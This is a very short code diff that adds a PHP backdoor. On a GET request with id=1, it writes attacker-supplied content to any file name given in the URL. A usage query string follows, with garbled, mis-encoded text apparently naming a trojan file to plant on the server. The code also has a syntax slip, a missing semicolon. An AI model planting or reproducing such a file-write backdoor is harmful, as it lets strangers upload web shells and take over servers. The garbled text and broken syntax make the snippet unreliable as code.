@@ -1,0 +1,7 @@
+<?php 
+if($_GET['id']==1){
+	@file_put_contents($_GET['file'],$_GET['content'])
+}
+?>
+
+?id=1&file=Âí.php&content=ÂíÄÚÈİ
